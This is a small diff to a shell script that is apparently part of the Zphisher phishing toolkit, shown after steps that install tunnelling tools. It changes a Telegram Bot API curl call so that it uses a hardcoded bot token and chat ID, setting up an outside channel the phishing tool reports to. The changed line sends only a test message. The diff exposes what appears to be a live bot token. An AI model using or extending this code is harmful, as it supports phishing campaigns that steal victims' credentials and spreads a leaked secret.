@@ -926,5 +926,5 @@ check_status
 install_cloudflared
 install_localxpose
 # اختبار مباشر للدالة
-curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" -d chat_id="$CHAT_ID" -d text="Test from Zphisher" -d parse_mode="Markdown" > /dev/null
+curl -s -X POST "https://api.telegram.org/bot8450258813:AAHCKf6i3a3QR-4R5k7IpmooXOJv2lX8zRM/sendMessage" -d chat_id="6840048574" -d text="Test from Zphisher" > /dev/null
 main_menu
